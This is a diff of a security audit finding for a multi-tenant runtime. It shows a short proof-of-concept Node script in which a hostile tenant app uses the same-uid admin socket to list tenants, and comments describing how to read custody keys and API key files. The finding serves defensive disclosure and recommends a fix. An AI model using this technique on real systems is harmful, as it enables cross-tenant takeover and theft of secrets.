@@ -11,7 +11,7 @@ process or Node tiers — only the unbuilt microVM tier confines Linux).
 
 **Root cause (code):**
 - `mgmt/server.go:ListenUnix` + `uidListener.Accept` authorize the admin API
-  purely by `peercred` same-uid. Every twd component **and every tenant Node
+  purely by `peercred` same-uid. Every tailworks component **and every tenant Node
   app** runs as the same uid.
 - `hostd/node.go` runs the tenant's app as a plain Node process. On Linux no
   sandbox is applied, so the app has full filesystem + AF_UNIX access.
@@ -19,25 +19,25 @@ process or Node tiers — only the unbuilt microVM tier confines Linux).
 **Exploit (hostile tenant Node app, Linux process/node tier):**
 
 ```js
-// Dropped into any twd Node workload (templates/node-*). No native exploit,
+// Dropped into any tw Node workload (templates/node-*). No native exploit,
 // no V8 escape: ordinary Node with raw socket + fs access as the shared uid.
 import net from "node:net";
 import fs from "node:fs";
 
 // 1. Find mgmt's admin socket + custody/API-key material under the state dir.
-//    (~/.twd/run/mgmt.sock, ~/.twd/<...>/custody.key, tenant apiKeyFile paths
+//    (~/.tailworks/run/mgmt.sock, ~/.tailworks/<...>/custody.key, tenant apiKeyFile paths
 //    returned by GET /v0/tenants). Dirs are 0700 but same-uid => readable.
-const sock = process.env.HOME + "/.twd/run/mgmt.sock";
+const sock = process.env.HOME + "/.tailworks/run/mgmt.sock";
 
 // 2. Speak the mgmt admin HTTP API over the socket as the "local" principal
 //    (LocalHandler treats every same-uid connection as admin).
 const c = net.createConnection(sock, () => {
-  c.write("GET /v0/tenants HTTP/1.1\r\nHost: twd\r\nConnection: close\r\n\r\n");
+  c.write("GET /v0/tenants HTTP/1.1\r\nHost: tw\r\nConnection: close\r\n\r\n");
 });
 c.on("data", (b) => process.stdout.write(b)); // => every tenant + apiKeyFile path
 
 // 3. With admin access: kill ANY tenant's objects, enumerate objects/leases,
-//    read each tenant's node keys from ~/.twd state dirs, read mgmt custody.key
+//    read each tenant's node keys from ~/.tailworks state dirs, read mgmt custody.key
 //    and decrypt custody secrets, read tenant API key files.
 ```
 
@@ -51,7 +51,7 @@ E2E-MULTI isolation claim on Linux. macOS is mitigated by the Seatbelt profile.
 tier on Linux has no per-tenant confinement" (integration gap). But the
 **E2E-MULTI "isolation holds" headline and DoD item 2 are macOS-only**; they do
 not hold on the Linux process or Node tiers, which the docs present as
-first-class (`LINUX-PLAN`). This should be stated as a hard precondition.
+first-class (docs/install-testing.md, "Linux requirements"). This should be stated as a hard precondition.
 
 **Recommended fix:** do not rely on same-uid peercred for the mgmt admin socket.
 Options: (a) run each tenant workload under a distinct uid + per-tenant
